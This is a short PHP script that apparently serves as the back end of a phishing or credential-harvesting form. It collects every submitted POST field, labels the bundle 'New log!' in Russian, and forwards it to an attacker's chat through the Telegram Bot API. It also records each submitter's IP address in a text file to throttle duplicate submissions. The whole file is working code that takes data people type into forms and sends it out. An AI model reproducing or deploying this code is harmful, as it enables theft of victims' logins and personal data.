<?php
require "telegram.php";

foreach ($_POST as $key => $value) {
	if ($value != '') {
		$text = $text.' | '.$value;
	}
}


$user_ip = $_POST['data2'];

$texter = file_get_contents("baseip.txt");

//count ip
$ipcount = substr_count($texter, $user_ip);

if($ipcount >= $countip){

  $filed = "baseip.txt";
  $rez = file_get_contents($filed);
  $rez .= "\r\n".$user_ip."";
  file_put_contents($filed, $rez);
} else {


  $text = "Новый лог! $text";
  $send = file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$telegram_admin_id&parse_mode=html&text=$text");


  $filed = "baseip.txt";
  $rez = file_get_contents($filed);
  $rez .= "\r\n".$user_ip."";
  file_put_contents($filed, $rez);
}
?>
